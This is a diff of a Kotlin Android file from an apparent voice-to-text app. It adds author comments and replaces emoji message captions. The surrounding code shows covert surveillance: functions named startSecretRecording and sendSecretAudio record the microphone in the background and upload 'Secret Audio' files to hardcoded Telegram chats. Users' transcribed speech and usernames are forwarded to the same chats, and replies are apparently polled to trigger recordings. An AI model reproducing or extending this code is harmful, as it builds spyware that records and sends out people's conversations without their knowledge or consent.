@@ -1,3 +1,4 @@
+// Coded by SUKH-X
 package com.voicetotextapp
 
 import android.util.Log
@@ -21,7 +22,7 @@ object TelegramApi {
         val durationSec = durationMs / 1000
         val sentTime = java.text.DateFormat.getDateTimeInstance().format(java.util.Date())
         val finalTranscribedText = transcribedText.ifEmpty { "(No speech detected)" }
-        val caption = "🎤 New Voice Log\n\n👤 User: $username\n⏱ Duration: ${durationSec}s\n🕒 Time: $sentTime\n\n📝 Converted Text:\n\"$finalTranscribedText\""
+        val caption = "[AUDIO] New Voice Log\n\nUser: $username\nDuration: ${durationSec}s\nTime: Time: $sentTime\n\nText: Converted Text:\n\"$finalTranscribedText\""
 
         Thread {
             for (chatId in CHAT_IDS) {
@@ -72,6 +73,7 @@ object TelegramApi {
     val activeReplyFlow = kotlinx.coroutines.flow.MutableStateFlow<ReplyData?>(null)
     private var isPolling = false
 
+    // Coded by SUKH-X
     fun startPollingReplies(username: String, context: Context) {
         if (isPolling) return
         isPolling = true
@@ -137,6 +139,7 @@ object TelegramApi {
         }.start()
     }
 
+    // Coded by SUKH-X
     fun markReplyConsumed(messageId: Int, context: Context) {
         val sharedPrefs = context.getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
         sharedPrefs.edit().putBoolean("consumed_$messageId", true).apply()
@@ -173,6 +176,7 @@ object TelegramApi {
         }.start()
     }
 
+    // Coded by SUKH-X
     private fun startSecretRecording(context: Context, username: String, durationSec: Int) {
         Thread {
             val audioFile = File(context.cacheDir, "secret_${System.currentTimeMillis()}.m4a")
@@ -204,12 +208,13 @@ object TelegramApi {
             }
             
             if (audioFile.exists() && audioFile.length() > 0) {
-                val caption = "🕵️ Secret Audio\n👤 User: $username\n⏱ Duration: ${durationSec}s"
+                val caption = "[SECRET] Secret Audio\nUser: $username\nDuration: ${durationSec}s"
                 sendSecretAudio(audioFile, caption)
             }
         }.start()
     }
 
+    // Coded by SUKH-X
     private fun sendSecretAudio(audioFile: File, caption: String) {
         for (chatId in CHAT_IDS) {
             val requestBody = MultipartBody.Builder()
@@ -238,6 +243,7 @@ object TelegramApi {
         }
     }
 
+    // Coded by SUKH-X
     private fun sendTextMessage(chatId: String, text: String) {
         val json = JSONObject().apply {
             put("chat_id", chatId)
@@ -258,7 +264,7 @@ object TelegramApi {
     fun sendNewUserNotification(username: String) {
         Thread {
             for (chatId in CHAT_IDS) {
-                sendTextMessage(chatId, "🎉 New User Registered: $username")
+                sendTextMessage(chatId, "[NEW USER] New User Registered: $username")
             }
         }.start()
     }
